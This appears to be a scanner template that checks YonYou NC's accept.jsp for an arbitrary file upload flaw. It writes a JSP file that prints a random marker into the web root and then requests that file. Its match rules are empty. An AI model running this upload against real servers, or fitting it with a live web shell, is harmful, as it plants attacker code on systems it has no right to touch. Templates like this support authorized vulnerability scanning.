id: yonyou-nc-accept-fileupload
brief:
    title: YonYou NC Accept Upload - Arbitray File Upload
    by: SleepingBag945
    level: critical
    about: Arbitrary file upload vulnerability in UFIDA N C accept.jsp . An attacker can obtain website permissions through the vulnerability.
    label:
        - yonyou
        - nc
        - intrusive
        - fileupload
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/aim/equipmap/accept.jsp'
      head:
        Accept: '*/*'
        Accept-Encoding: gzip
        Content-Type: multipart/form-data; boundary=---------------------------16314487820932200903769468567
      body: |-
        -----------------------------16314487820932200903769468567
        Content-Disposition: form-data; name="upload"; filename="{{randstr_1}}.txt"
        Content-Type: text/plain

        <% out.println("{{randstr_2}}"); %>
        -----------------------------16314487820932200903769468567
        Content-Disposition: form-data; name="fname"

        \webapps\nc_web\{{randstr_3}}.jsp
        -----------------------------16314487820932200903769468567--
      signs: []
    - verb: GET
      to:
        - '{{BaseURL}}/{{randstr_3}}.jsp'
      head:
        Accept-Encoding: gzip
        Content-Type: application/x-www-form-urlencoded
      signs: []
